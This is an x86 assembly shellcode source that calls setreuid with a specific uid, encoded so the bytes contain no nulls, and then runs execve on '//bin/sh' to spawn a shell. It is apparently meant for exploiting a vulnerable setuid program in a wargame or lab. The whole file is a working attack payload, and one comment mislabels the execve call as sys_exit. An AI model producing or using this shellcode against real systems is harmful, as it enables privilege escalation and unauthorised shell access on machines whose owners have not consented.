section .data
section .bss
section .text
  global _start   ; must be declared for linker

_start:           ; entry point
  ; added later - start

  ; mov ebx, 14002
  mov ebx, 16857011
  sub ebx, 16843009
  ; mov ecx, 14002
  mov ecx, 16857011
  sub ecx, 16843009
  xor eax, eax
  mov al, 70     ; setreuid(14002, 14002)
  int 0x80

  ; added later - end

  xor eax, eax
  ; '//bin/sh'[::-1].encode('utf8').hex() gives 68732f6e 69622f2f
  push eax
  push 0x68732f6e
  push 0x69622f2f
  mov ebx, esp    ; load //bin/sh into ebx : pathname

  push eax
  mov edx, esp    ; load 0x0 into edx : envp

  push ebx

  mov ecx, esp    ; load argv in. ecx points to [ebx, eax], which is //bin/sh and a nullptr
  mov al, 11      ; sys_execve

  int 0x80        ; call sys_exit
